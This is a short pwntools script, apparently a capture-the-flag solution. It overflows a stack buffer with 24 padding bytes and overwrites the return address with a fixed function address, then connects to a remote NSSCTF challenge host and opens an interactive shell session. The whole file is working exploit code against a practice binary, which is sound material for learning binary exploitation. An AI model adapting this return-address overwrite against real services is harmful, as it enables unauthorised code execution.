from pwn import *

p = process('./pwn')
p = remote('node4.anna.nssctf.cn',28066)
payload = b'b'*(16+8)
payload += p64(0x00000000004005B6)

p.sendline(payload)

p.interactive()

